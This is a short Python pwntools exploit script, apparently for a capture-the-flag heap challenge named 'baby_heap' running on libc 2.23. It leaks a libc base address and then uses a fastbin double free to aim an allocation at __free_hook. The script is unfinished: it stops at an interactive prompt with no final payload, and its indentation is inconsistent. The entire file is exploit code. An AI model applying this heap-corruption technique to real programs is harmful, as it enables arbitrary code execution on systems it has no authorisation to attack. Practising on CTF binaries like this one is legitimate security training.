from pwn import *

def add (choice, size, data):
	r.sendafter(">\n", str(choice))
	r.sendafter("Size:", str(size))
	r.sendafter("Data:", str(data))

def show (choice, index):
	r.sendafter(">\n", str(choice))
        r.sendafter("Index :", str(index))

def dell (choice, index):
        r.sendafter(">\n", str(choice))
        r.sendafter("Index :", str(index))

r = process("./baby_heap")
l = ELF("libc-2.23.so")
add(1, 50, 123)
add(1, 50, 234)
add(1, 160, 123)
dell(3, 0)
dell(3, 2)
add(1, 0x30, " ")
show(2, 3)
offset = 0x3c4b20
libc = u64(r.recv(6) + '\0\0') - offset
success("libc -> %s" % hex(libc))

add(1, 0x50, 123)
add(1, 0x50, 234)
dell(3, 4)
dell(3, 5)
dell(3, 4)
add(1, 0x50, p64(libc+l.sym.__free_hook))
raw_input()
add(1, 0x50, 123)
add(1, 0x50, 234)
r.interactive()
